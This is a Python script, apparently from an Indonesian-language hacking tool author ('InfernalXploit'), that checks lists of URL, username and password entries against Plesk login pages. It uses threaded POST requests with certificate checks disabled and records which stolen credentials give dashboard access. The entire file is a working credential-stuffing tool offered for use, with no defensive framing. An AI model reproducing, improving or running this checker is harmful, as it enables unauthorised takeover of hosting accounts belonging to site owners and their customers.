#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Script by InfernalXploit

import requests
import sys
import os
import time
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Menonaktifkan peringatan SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Warna untuk output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Banner InfernalXploit
def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""{Colors.RED}{Colors.BOLD}
    ██╗███╗   ██╗███████╗██████╗ ██████╗ ███╗   ██╗ █████╗ ██╗     ██╗  ██╗██████╗ ██╗ ██████╗ ████████╗
    ██║████╗  ██║██╔════╝██╔══██╗██╔══██╗████╗  ██║██╔══██╗██║     ╚██╗██╔╝██╔══██╗██║██╔═══██╗╚══██╔══╝
    ██║██╔██╗ ██║█████╗  ██████╔╝██████╔╝██╔██╗ ██║███████║██║      ╚███╔╝ ██████╔╝██║██║   ██║   ██║   
    ██║██║╚██╗██║██╔══╝  ██╔══██╗██╔══██╗██║╚██╗██║██╔══██║██║      ██╔██╗ ██╔═══╝ ██║██║   ██║   ██║   
    ██║██║ ╚████║███████╗██║  ██║██║  ██║██║ ╚████║██║  ██║███████╗██╔╝ ██╗██║     ██║╚██████╔╝   ██║   
    ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝    ╚═╝   
    {Colors.END}
    {Colors.CYAN}{Colors.BOLD}                           Plesk Checker - InfernalXploit Edition{Colors.END}
    {Colors.YELLOW}                         https://github.com/InfernalXploit/ClientAreaChecker{Colors.END}
    """
    print(banner)

def extract_domain(url):
    """Mengekstrak domain dari URL"""
    try:
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        if ':' in domain:
            domain = domain.split(':')[0]
        return domain
    except:
        return url

def check_login(url, username, password):
    """
    Fungsi untuk mengecek login ke client area dan dashboard
    """
    try:
        # Data yang akan dikirim
        data = {
            'username': username,
            'password': password,
            'login': 'Login'
        }
        
        # Header untuk request
        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': url,
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Melakukan POST request
        session = requests.Session()
        response = session.post(url, data=data, headers=headers, timeout=15, verify=False)
        
        # Cek jika login berhasil (biasanya redirect atau pesan sukses)
        login_success = False
        if response.status_code == 200:
            # Menganalisis respons untuk menentukan apakah login berhasil
            if "dashboard" in response.text.lower() or "welcome" in response.text.lower() or "logout" in response.text.lower():
                login_success = True
            elif "invalid" in response.text.lower() or "gagal" in response.text.lower() or "salah" in response.text.lower():
                login_success = False
            else:
                # Jika tidak bisa menentukan, coba akses halaman setelah login
                try:
                    dashboard_url = url.replace('login_up.php', 'dashboard.php')
                    dashboard_response = session.get(dashboard_url, timeout=10, verify=False)
                    if dashboard_response.status_code == 200 and "dashboard" in dashboard_response.text.lower():
                        login_success = True
                    else:
                        login_success = False
                except:
                    login_success = False
        elif response.status_code == 302:
            # Redirect biasanya menandakan login berhasil
            login_success = True
        else:
            login_success = False
            
        # Jika login berhasil, coba akses dashboard untuk memastikan
        if login_success:
            try:
                dashboard_url = url.replace('login_up.php', 'dashboard.php')
                dashboard_response = session.get(dashboard_url, timeout=10, verify=False)
                if dashboard_response.status_code != 200 or "dashboard" not in dashboard_response.text.lower():
                    login_success = False
            except:
                login_success = False
                
        return login_success
            
    except requests.exceptions.RequestException:
        return False

def process_line(line):
    """
    Memproses setiap baris dari file input
    """
    parts = line.strip().split('|')
    if len(parts) < 3:
        return None
    
    url = parts[0].strip()
    username = parts[1].strip()
    password = parts[2].strip()
    
    return url, username, password

def main():
    print_banner()
    
    # Meminta input file dari pengguna
    filename = input(f"{Colors.CYAN}[?] Masukkan nama file input (contoh: accounts.txt): {Colors.END}").strip()
    if not filename:
        filename = "accounts.txt"
    
    # Meminta nama file output untuk hasil valid
    output_filename = input(f"{Colors.CYAN}[?] Masukkan nama file output untuk hasil valid (default: client_valid.txt): {Colors.END}").strip()
    if not output_filename:
        output_filename = "client_valid.txt"
    
    # Memeriksa apakah file input ada
    if not os.path.isfile(filename):
        print(f"{Colors.RED}[!] File {filename} tidak ditemukan!{Colors.END}")
        sys.exit(1)
    
    # Membaca file
    accounts = []
    with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
        for line_num, line in enumerate(file, 1):
            if line.strip() and not line.startswith('#'):
                account = process_line(line)
                if account:
                    accounts.append(account)
                else:
                    print(f"{Colors.YELLOW}[!] Format salah pada baris {line_num}: {line.strip()}{Colors.END}")
    
    if not accounts:
        print(f"{Colors.RED}[!] Tidak ada akun yang ditemukan dalam file!{Colors.END}")
        sys.exit(1)
    
    print(f"{Colors.GREEN}[+] Menemukan {len(accounts)} akun untuk diperiksa...{Colors.END}\n")
    
    # Memeriksa setiap akun
    valid_accounts = []
    invalid_accounts = []
    valid_domains = set()
    
    print(f"{Colors.BLUE}[*] Memulai proses pengecekan login dan dashboard...{Colors.END}\n")
    
    # Pertama kita cek semua akun
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_account = {executor.submit(check_login, url, username, password): (url, username, password) for url, username, password in accounts}
        
        for i, future in enumerate(as_completed(future_to_account), 1):
            url, username, password = future_to_account[future]
            try:
                result = future.result()
                domain = extract_domain(url)
                if result:
                    valid_accounts.append((url, username, password, domain))
                    valid_domains.add(domain)
                    print(f"{Colors.GREEN}[SUCCESS] {url} | {username} | {password}{Colors.END}")
                else:
                    print(f"{Colors.RED}[FAILED] {url} | {username} | {password}{Colors.END}")
                    invalid_accounts.append((url, username, password, domain))
            except Exception as e:
                print(f"{Colors.RED}[ERROR] {url} | {username} | {password} - {str(e)}{Colors.END}")
                invalid_accounts.append((url, username, password, domain))
    
    # Setelah selesai, tampilkan total domain valid
    print(f"\n{Colors.BOLD}{Colors.CYAN}========== HASIL PENGEcekan =========={Colors.END}")
    print(f"{Colors.GREEN}[+] Login berhasil: {len(valid_accounts)} akun{Colors.END}")
    print(f"{Colors.RED}[-] Login gagal: {len(invalid_accounts)} akun{Colors.END}")
    print(f"{Colors.YELLOW}[+] Total domain valid: {len(valid_domains)} domain{Colors.END}")
    
    # Menampilkan daftar domain valid
    if valid_domains:
        print(f"\n{Colors.BOLD}{Colors.CYAN}========== DOMAIN VALID =========={Colors.END}")
        for i, domain in enumerate(sorted(valid_domains), 1):
            print(f"{Colors.GREEN}[{i}] {domain}{Colors.END}")
    
    # Menyimpan hasil ke file
    if valid_accounts:
        with open(output_filename, 'w') as f:
            for url, username, password, domain in valid_accounts:
                f.write(f"{url}|{username}|{password}\n")
        print(f"{Colors.GREEN}[+] Hasil login berhasil disimpan di: {output_filename}{Colors.END}")
    
    # Juga menyimpan hasil invalid jika diperlukan
    if invalid_accounts:
        invalid_output = output_filename.replace('_valid.', '_invalid.')
        with open(invalid_output, 'w') as f:
            for url, username, password, domain in invalid_accounts:
                f.write(f"{url}|{username}|{password}\n")
        print(f"{Colors.YELLOW}[+] Hasil login gagal disimpan di: {invalid_output}{Colors.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program dihentikan oleh pengguna.{Colors.END}")
        sys.exit(0)
